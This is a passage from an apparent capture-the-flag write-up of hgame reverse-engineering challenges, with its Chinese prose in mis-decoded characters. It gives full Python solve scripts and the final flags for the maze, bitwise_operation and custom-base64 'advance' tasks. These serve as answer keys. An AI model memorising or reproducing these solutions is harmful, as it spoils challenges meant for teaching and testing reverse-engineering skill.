class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">usefulmaze=''</span><br><span class="line"><span class="symbol">for i in range(len(maze)):</span></span><br><span class="line"><span class="symbol">    if i%64==0:</span></span><br><span class="line">        usefulmaze+=<span class="string">"\n"</span></span><br><span class="line"><span class="symbol">    if i%4==0:</span></span><br><span class="line">        usefulmaze+=str(maze[i])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">print usefulmaze</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><p><img src="https://i.loli.net/2020/04/30/p7XQ8zSv2gnRmkN.png" alt="img"></p><p>æ‰€ä»¥flagï¼šhgame{ssssddddddsssssddwwdddssssdssdd}</p><h3 id="bitwise-operation"><a href="#bitwise-operation" class="headerlink" title="bitwise_operation"></a>bitwise_operation</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-18"><a href="#é¢˜ç›®ä»‹ç»ï¼š-18" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p> è¿˜è®°å¾—ç¬¬ä¸‰æ¬¡Cè¯­è¨€åŸ¹è®­çš„ä½œä¸šâ€œä½è¿ç®—â€å—ï¼Ÿè¿™æ˜¯2.0<br>å­¦ä¹ èµ„æ–™ï¼š<a href="http://q42u2raim.bkt.clouddn.com/bitwise-hint1-xor.png" target="_blank" rel="noopener">http://q42u2raim.bkt.clouddn.com/bitwise-hint1-xor.png</a> </p><h4 id="è§£é¢˜æ€è·¯ï¼š-18"><a href="#è§£é¢˜æ€è·¯ï¼š-18" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>ä¹Ÿæ˜¯ä¸€ä¸ªé™æ€åˆ†æçš„é¢˜</p><p>æ ¸å¿ƒä»£ç ï¼š</p><p><img src="https://i.loli.net/2020/04/30/CurdNw6vIlkLzQf.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œv8ï¼Œv11,v13ï¼Œæ˜¯è´Ÿæ•°ï¼Œç„¶ååˆ¤æ–­é‚£è¾¹ä¹Ÿæœ‰ä¸€äº›ç‰¹å®šæ˜¯æ•°å­—ï¼Œ</p><p>å…¶å®é€šè¿‡å‰é¢çš„å˜é‡çš„å®šä¹‰</p><p>è¿™äº›éƒ½æ˜¯å­—ç¬¦å‹ï¼Œæ‰€ä»¥å…¶å®æ˜¯å¯ä»¥ç”¨Ré”®æ¥è½¬æ¢çš„</p><p>å¦‚æœæœ‰ä¸å¯è§å­—ç¬¦ï¼Œä¸æ–¹ä¾¿çœ‹ï¼Œé‚£å°±ç”¨Hé”®å˜æˆintå‹ï¼Œ</p><p>è¿™äº›é”®ä½çš„æ„æ€ï¼Œå³é”®å°±å¯ä»¥çœ‹åˆ°äº†</p><p>è½¬å˜ä¹‹åå°±å˜æˆäº†è¿™æ ·</p><p><img src="https://i.loli.net/2020/04/30/yIFgl2DxJrOGWnR.png" alt="img"></p><p>è¿™æ ·ä¼šæ–¹ä¾¿çš„å¤š</p><p>æˆ‘ä»¬å…ˆçœ‹åˆ°å…¶ä¸­å¾—å‡½æ•°sub_400616ï¼ˆï¼‰</p><p>è¯»ä¸‹æ¥å…¶å®ä¸éš¾æ˜ç™½ï¼Œå…¶å®å°±æ˜¯å®ç°äº†ä¸€ä¸ªatollçš„åŠŸèƒ½ï¼Œ</p><p>å°±æ˜¯å°†å­—ç¬¦ä¸²æ¯ä¸¤ä½å–ä¸‹æ¥ï¼Œä½œä¸ºä¸€ä¸ªæ•´å‹ï¼Œä¸¾ä¸ªæ —å­ï¼Œå°±æ˜¯ â€˜abcdefâ€™ï¼Œè½¬åŒ–ä¸ºä¸‰ä¸ªæ•°å­—ï¼Œ0xab,0xcd,0xef</p><p>å…¶ä¸­ï¼Œv14æ˜¯æˆ‘ä»¬è¾“å…¥ï¼ˆé™¤å»hgame{}ï¼‰çš„å‰16ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ä¼šè½¬æˆ8ä¸ªæ•°å­—</p><p>v16æ˜¯æˆ‘ä»¬è¾“å…¥ï¼ˆé™¤å»hgame{}ï¼‰çš„å16ä¸ªå­—ç¬¦ï¼Œä¹Ÿæ˜¯ä¼šè½¬æˆ8ä¸ªæ•°å­—</p><p>ç„¶åæˆ‘ä»¬çœ‹åˆ°ä¸­é—´ä¸€å¤§å—çš„åŠ å¯†ä»£ç ä¸­é—´æ¶‰åŠçš„ä½æ“ä½œï¼Œæ‰€ä»¥è¿™è¾¹å»ºè®®å¯ä»¥æŠŠè¿™äº›åå…­è¿›åˆ¶è½¬åŒ–ä¸ºäºŒè¿›åˆ¶æ¥çœ‹</p><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œä¸ï¼ˆ&amp;ï¼‰ä¸Š0xE0ï¼Œå°±æ˜¯å–å‰ä¸‰ä½çš„æ„æ€ï¼Œ</p><p>è€Œ*8 è¿™ä¸ªæ“ä½œç›¸å½“äºï¼Œ*2^3^,åœ¨äºŒè¿›åˆ¶ä¸‹ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºå·¦ç§»3ä½ï¼Œç„¶ååˆæˆ–ï¼ˆ|ï¼‰ä¸Šä¹‹å‰å–å¾—ä¸‰ä½æ•°ï¼Œä¹Ÿå°±æ˜¯æŠŠä¹‹å‰å¾—ä¸‰ä½åŠ åœ¨è¿™ä¸ªå·¦ç§»äº†ä¸‰ä½å¾—æ•°ä¸Šï¼Œåˆå› ä¸ºè¿™ä¸ªå˜é‡æ˜¯ä¸€ä¸ªcharå‹ï¼Œåªæœ‰1ä¸ªå­—èŠ‚ï¼Œæ‰€æœ‰é«˜ä½æŠ¹æ‰ã€‚</p><p>æ€»è€Œè¨€ä¹‹ï¼Œè¿™ä¸ªåŠ å¯†ç¬¬ä¸€è¡Œå¾—æ“ä½œå°±æ˜¯å°†ä¸€ä¸ªå­—èŠ‚å¾—å€¼å¾ªç¯å·¦ç§»äº†ä¸‰ä½ã€‚ </p><p>ä¸¾ä¸ªæ —å­ï¼š 0b<strong>101</strong>00011 -&gt; 0b 00011<strong>101</strong></p><p>æˆ‘ä»¬å†çœ‹åˆ°ï¼Œä¸ï¼ˆ&amp;ï¼‰ä¸Š0x55å’Œä¸ï¼ˆ&amp;ï¼‰ä¸Š0xAAåˆ†åˆ«æ˜¯å–è¿™ä¸ªæ•°å¾—å¥‡æ•°ä½å’Œå¶æ•°ä½ï¼Œè‹¥ä¹‹åå†æˆ–ï¼ˆ|ï¼‰ä¸Šï¼Œå…¶å®ç›¸å½“äºå•¥ä¹Ÿæ²¡å˜ï¼Œ</p><p>è€Œä¹˜ä»¥2ï¼Œä¹Ÿå°±ç›¸å½“äºå·¦ç§»äº†ä¸€ä½ï¼Œ</p><p>æœ€åæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªåŠ å¯†ç®€åŒ–æˆè¿™æ ·ï¼š</p><p><img src="https://i.loli.net/2020/05/01/RuX5jicKq8IfBnA.png" alt="image-20200121164628877"></p><p>ç„¶åæˆ‘ä»¬çœ‹ä¸‹é¢çš„åˆ¤æ–­</p><p>å…¶ä¸­v14æ˜¯åŠ å¯†è¿‡åçš„å€¼ï¼Œå†ä¸v6ï¼ˆæˆ‘ä»¬å§‘ä¸”æŠŠè¿™ä¸ªv6å½“ä½œä¸€ä¸ªkeyï¼Œå€¼å°±æ˜¯ä¸Šé¢æ‰€ç»™çš„8ä¸ªæ•°å­—ï¼‰é€ä½å¼‚æˆ–åï¼Œä¸byte_602060åˆ¤æ–­ã€‚å…¶ä¸­byte_602060å°±æ˜¯<img src="https://i.loli.net/2020/05/01/YLHT8BOAqpGmyfw.png" alt="img"></p><p>ä¸Šé¢çš„8ä¸ªå­—ç¬¦ï¼Œä¸‹é¢çš„8ä¸ªå­—ç¬¦ç•™ç€åˆ¤æ–­ä¸‹ä¸€æ®µ</p><p>ç„¶åv16å†ä¸v14å’Œkeyé€ä½å¼‚æˆ–ï¼Œå¾—åˆ°å€¼ä¸ä¸Šå›¾ä¸‹é¢çš„8ä¸ªå­—ç¬¦åˆ¤æ–­ã€‚<strong>æ³¨æ„ï¼Œ</strong>æ­¤æ—¶çš„v14å·²ç»æ˜¯ä¸keyå¼‚æˆ–è¿‡åçš„å€¼äº†ï¼Œå†æ¬¡å¼‚æˆ–keyï¼Œä¸¤æ¬¡å¼‚æˆ–ç›¸å½“äºæ²¡æœ‰å¼‚æˆ–ï¼Œæ‰€ä»¥å¯ä»¥çœ‹æˆv16ç›´æ¥ä¸åŸæ¥åŠ å¯†è¿‡åçš„v14å¼‚æˆ–ã€‚</p><p>æ­£å‘åŠ å¯†æˆ‘ä»¬äº†è§£äº†åï¼Œæˆ‘ä»¬å¯ä»¥é€†å‘è§£å¯†äº†ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“ä¸¤æ®µå­—ç¬¦ï¼Œåˆ†åˆ«æ˜¯ä¸²1ï¼še4sy_Re_å’Œä¸²2ï¼šEasylif3ï¼Œ</p><p>step1ï¼š</p><p>é¦–å…ˆæˆ‘ä»¬æŠŠä¸²1å’Œkeyå¼‚æˆ–ï¼Œå°±å¯ä»¥å¾—åˆ°v14ï¼Œç„¶åæˆ‘ä»¬å°†ä¸²2å’Œv14å¼‚æˆ–å¯ä»¥å¾—åˆ°v16 ï¼ˆæˆ–è€…ä¹Ÿå¯ä»¥ä¸²1å’Œä¸²2å’Œkeyå¼‚æˆ–ï¼Œå¾—åˆ°v16ï¼‰</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">FLAG</span>=[]</span><br><span class="line">res14=[]</span><br><span class="line">res16=[]</span><br><span class="line">key=[<span class="string">'76'</span>,<span class="string">'60'</span>,<span class="string">'214'</span>,<span class="string">'54'</span>,<span class="string">'80'</span>,<span class="string">'136'</span>,<span class="string">'32'</span>,<span class="string">'204'</span>]</span><br><span class="line"><span class="built_in">flag</span>=<span class="string">'e4sy_Re_Easylif3'</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">0</span>,len(<span class="built_in">flag</span>),<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">FLAG</span>.<span class="built_in">append</span>(<span class="built_in">flag</span>[i:i+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">8</span>):</span><br><span class="line">    res14.<span class="built_in">append</span>(int(key[i])^int(<span class="built_in">FLAG</span>[i],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">8</span>):</span><br><span class="line">    res16.<span class="built_in">append</span>(int(<span class="built_in">FLAG</span>[i+<span class="number">8</span>],<span class="number">16</span>)^int(res14[i]))</span><br></pre></td></tr></table></figure><p>step2:</p><p><img src="https://i.loli.net/2020/05/01/qpNTojy5nALmaks.png" alt="img"></p><p>æ­¤æ—¶æˆ‘ä»¬å·²ç»çŸ¥é“å¼å­å·¦è¾¹çš„a1[i]ï¼Œå¼å­å³è¾¹çš„a1[i]ï¼Œåªéœ€è¦å¼å­å·¦å³è¾¹çš„a1[i] ä¸ ((a2[7-i] &amp; 0xaa) &gt;&gt; 1 )  å¼‚æˆ–ä¸€éå³å¯</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)<span class="symbol">:</span></span><br><span class="line">    a1.append(res14[i] ^ ((res16[<span class="number">7</span>-i] &amp; <span class="number">170</span>) <span class="meta">&gt;&gt; </span><span class="number">1</span> ))</span><br></pre></td></tr></table></figure><p>ä¹‹åçš„æ“ä½œåŒç†ï¼Œ</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(<span class="number">8</span>):</span><br><span class="line">    a2.append(res16[<span class="number">7</span>-<span class="built_in">i</span>] ^ ((a1[<span class="built_in">i</span>] &amp; <span class="number">85</span>) &lt;&lt; <span class="number">1</span> )<span class="comment">%256)</span></span><br><span class="line"></span><br><span class="line">a2.reverse()</span><br><span class="line"></span><br><span class="line">a1_1=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(<span class="number">8</span>):</span><br><span class="line">    a1_1.append(a1[<span class="built_in">i</span>] ^ ((a2[<span class="number">7</span>-<span class="built_in">i</span>] &amp; <span class="number">170</span>) &gt;&gt; <span class="number">1</span> ))</span><br></pre></td></tr></table></figure><p>æœ€åä¹‹å‰æ˜¯å¾ªç¯å·¦ç§»çš„ï¼Œæˆ‘ä»¬å¾ªç¯å³ç§»å°±å¯</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a_final=[]</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(<span class="number">8</span>):</span><br><span class="line">    <span class="built_in">ans</span>=bin(a1_1[<span class="built_in">i</span>])[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">"0"</span>)</span><br><span class="line">    a_final.append(int(<span class="built_in">ans</span>[<span class="number">5</span>:<span class="number">8</span>]+<span class="built_in">ans</span>[<span class="number">0</span>:<span class="number">5</span>],<span class="number">2</span>))</span><br></pre></td></tr></table></figure><p>æœ€åå°±å¯ä»¥å¾—åˆ°flagäº†</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">flag</span>=<span class="string">"hgame&#123;"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> a_final:</span><br><span class="line">    <span class="built_in">flag</span>+=hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> a2:</span><br><span class="line">    <span class="built_in">flag</span>+=hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">flag</span>+=<span class="string">"&#125;"</span></span><br><span class="line">print <span class="built_in">flag</span></span><br></pre></td></tr></table></figure><h4 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h4><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">def encode():</span><br><span class="line">    s=<span class="string">'0f233e63637982d266cbf41ecb1b0102'</span></span><br><span class="line">    key=[<span class="string">'76'</span>,<span class="string">'60'</span>,<span class="string">'214'</span>,<span class="string">'54'</span>,<span class="string">'80'</span>,<span class="string">'136'</span>,<span class="string">'32'</span>,<span class="string">'204'</span>]</span><br><span class="line">    a1=[]</span><br><span class="line">    a2=[]</span><br><span class="line">    for i in range(<span class="number">0</span>,<span class="number">16</span>,<span class="number">2</span>):</span><br><span class="line">        a1.append(int(s[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">        a2.append(int(s[<span class="number">16</span>+i:<span class="number">16</span>+i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    </span><br><span class="line">    for i in range(<span class="number">8</span>):</span><br><span class="line">        #print i</span><br><span class="line">        a1[i] = (((a1[i] &amp; <span class="number">0xE0</span>) &gt;&gt; <span class="number">5</span>) | <span class="number">8</span> * a1[i]) <span class="comment">%256    #a1å¾ªç¯å³ç§»3ä½</span></span><br><span class="line">                    </span><br><span class="line">        a1[i] = a1[i] ^ ((a2[<span class="number">7</span>-i] &amp; <span class="number">0xaa</span> ) &gt;&gt; <span class="number">1</span> ) </span><br><span class="line">                    </span><br><span class="line">        a2[<span class="number">7</span>-i] =  a2[<span class="number">7</span>-i] ^ ((a1[i] &amp; <span class="number">0x55</span>) &lt;&lt; <span class="number">1</span> )</span><br><span class="line">                    </span><br><span class="line">        a1[i] = a1[i] ^ ((a2[<span class="number">7</span>-i] &amp; <span class="number">0xaa</span>) &gt;&gt; <span class="number">1</span> ) </span><br><span class="line"></span><br><span class="line">    test=<span class="string">""</span> </span><br><span class="line">    for i in range(len(key)):</span><br><span class="line">        test+=chr(a1[i]^int(key[i]))</span><br><span class="line">    for i in range(len(key)):</span><br><span class="line">        test+=chr(a2[i]^a1[i])</span><br><span class="line">    print test</span><br><span class="line"></span><br><span class="line">encode()</span><br><span class="line"></span><br><span class="line"><span class="symbol">FLAG</span>=[]</span><br><span class="line">res14=[]</span><br><span class="line">res16=[]</span><br><span class="line">key=[<span class="string">'76'</span>,<span class="string">'60'</span>,<span class="string">'214'</span>,<span class="string">'54'</span>,<span class="string">'80'</span>,<span class="string">'136'</span>,<span class="string">'32'</span>,<span class="string">'204'</span>]</span><br><span class="line">flag=<span class="string">'e4sy_Re_Easylif3'</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">for i in range(<span class="number">0</span>,len(flag),<span class="number">2</span>):</span><br><span class="line">    <span class="symbol">FLAG</span>.append(flag[i:i+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    res14.append(int(key[i])^int(<span class="symbol">FLAG</span>[i],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    res16.append(int(<span class="symbol">FLAG</span>[i+<span class="number">8</span>],<span class="number">16</span>)^int(res14[i]))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a1=[]</span><br><span class="line">a2=[]</span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    a1.append(res14[i] ^ ((res16[<span class="number">7</span>-i] &amp; <span class="number">170</span>) &gt;&gt; <span class="number">1</span> ))</span><br><span class="line"></span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    a2.append(res16[<span class="number">7</span>-i] ^ ((a1[i] &amp; <span class="number">85</span>) &lt;&lt; <span class="number">1</span> )<span class="comment">%256)</span></span><br><span class="line"></span><br><span class="line">a2.reverse()</span><br><span class="line"></span><br><span class="line">a1_1=[]</span><br><span class="line"></span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    a1_1.append(a1[i] ^ ((a2[<span class="number">7</span>-i] &amp; <span class="number">170</span>) &gt;&gt; <span class="number">1</span> ))</span><br><span class="line"></span><br><span class="line">a_final=[]</span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    ans=bin(a1_1[i])[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">"0"</span>)</span><br><span class="line">    a_final.append(int(ans[<span class="number">5</span>:<span class="number">8</span>]+ans[<span class="number">0</span>:<span class="number">5</span>],<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">flag=<span class="string">"hgame&#123;"</span></span><br><span class="line">for i in a_final:</span><br><span class="line">    flag+=hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">for i in a2:</span><br><span class="line">    flag+=hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">flag+=<span class="string">"&#125;"</span></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°flagï¼šhgame{0f233e63637982d266cbf41ecb1b0102}</p><h3 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-19"><a href="#é¢˜ç›®ä»‹ç»ï¼š-19" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p> â€œé«˜çº§åŠ å¯†ç®—æ³•â€ </p><h4 id="è§£é¢˜æ€è·¯ï¼š-19"><a href="#è§£é¢˜æ€è·¯ï¼š-19" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>çœ‹é¢˜ç›®è¿˜ä»¥ä¸ºæ˜¯AESåŠ å¯†</p><p>é¦–å…ˆè¿è¡Œä¸‹ç¨‹åº</p><p><img src="https://i.loli.net/2020/05/01/fni1Mub3rqZ6yNW.png" alt="image-20200121171024621"></p><p>æ”¾è¿›idaï¼Œå‘ç°å»æ‰äº†ç¬¦å·è¡¨ï¼Œæ‰¾ä¸åˆ°mainå‡½æ•°ç”šè‡³</p><p>é‚£æˆ‘ä»¬å°±æŸ¥æ‰¾ä¸€ä¸‹â€˜try againâ€™å­—ç¬¦</p><p>å¾—åˆ°æ ¸å¿ƒä»£ç éƒ¨åˆ†</p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸è¾“å…¥æœ‰å…³çš„å‡½æ•°æœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯sub_140002030ï¼Œsub_140002000ï¼Œsub_140001EB0</p><p>ä½†æ˜¯ç¨å¾®æœ‰ç‚¹ç»éªŒï¼Œæˆ–è€…æ˜¯å®ç°è¿‡base64åŠ å¯†çš„é€‰æ‰‹å¾ˆå®¹æ˜“å°±èƒ½çœ‹å‡ºè¿™å°±æ˜¯ä¸ªbase64åŠ å¯†</p><p>æ‰€ä»¥è¿™ä¸ªåŠ å¯†å°±æ˜¯base64åŠ å¯†äº†ï¼Œè€Œè¿™é‡Œçš„aAbcdefghijklmnæ˜¾ç„¶å°±æ˜¯è¿™ä¸ªåŠ å¯†çš„å¯†ç è¡¨çš„</p><p>åŒå‡»å¾—åˆ°å¯†ç è¡¨ï¼š</p><p>æ˜¯å°†æ­£å¸¸çš„base64è¡¨æ¢äº†ä¸ªé¡ºåºï¼Œ</p><p>ç›´æ¥ç¼–å†™æˆ–è€…æ‰¾ä¸€ä¸ªbase64è§£å¯†è„šæœ¬å³å¯å¾—åˆ°flag</p><h4 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_decode</span><span class="params">(s, dictionary)</span>:</span></span><br><span class="line">    base64inv = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(dictionary)):</span><br><span class="line">        base64inv[dictionary[i]] = i</span><br><span class="line"></span><br><span class="line">    s = s.replace(<span class="string">"\n"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.match(<span class="string">r"^([&#123;alphabet&#125;]&#123;&#123;4&#125;&#125;)*([&#123;alphabet&#125;]&#123;&#123;3&#125;&#125;=|[&#123;alphabet&#125;]&#123;&#123;2&#125;&#125;==)?$"</span>.format(alphabet = dictionary), s):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"Invalid input: &#123;&#125;"</span>.format(s))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(s) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    p = <span class="string">""</span> <span class="keyword">if</span> (s[<span class="number">-1</span>] != <span class="string">"="</span>) <span class="keyword">else</span> <span class="string">"AA"</span> <span class="keyword">if</span> (len(s) &gt; <span class="number">1</span> <span class="keyword">and</span> s[<span class="number">-2</span>] == <span class="string">"="</span>) <span class="keyword">else</span> <span class="string">"A"</span></span><br><span class="line">    r = <span class="string">""</span></span><br><span class="line">    s = s[<span class="number">0</span>:len(s) - len(p)] + p</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">4</span>):</span><br><span class="line">        n = (base64inv[s[c]] &lt;&lt; <span class="number">18</span>) + (base64inv[s[c+<span class="number">1</span>]] &lt;&lt; <span class="number">12</span>) + (base64inv[s[c+<span class="number">2</span>]] &lt;&lt; <span class="number">6</span>) + base64inv[s[c+<span class="number">3</span>]]</span><br><span class="line">        r += chr((n &gt;&gt; <span class="number">16</span>) &amp; <span class="number">255</span>) + chr((n &gt;&gt; <span class="number">8</span>) &amp; <span class="number">255</span>) + chr(n &amp; <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">return</span> r[<span class="number">0</span>:len(r) - len(p)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(dictionary)</span>:</span></span><br><span class="line">    print(base64_decode(<span class="string">"0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX"</span>, dictionary), end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    dictionary = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">    show(dictionary)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼šhgame{b45e6a_i5_50_eazy_6VVSQ}</p><h3 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-20"><a href="#é¢˜ç›®ä»‹ç»ï¼š-20" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p> easy cpp hint: ç¿»å¼€çº¿ä»£è¯¾æœ¬çœ‹çœ‹ </p><h4 id="è§£é¢˜æ€è·¯ï¼š-20"><a href="#è§£é¢˜æ€è·¯ï¼š-20" class="headerlink" 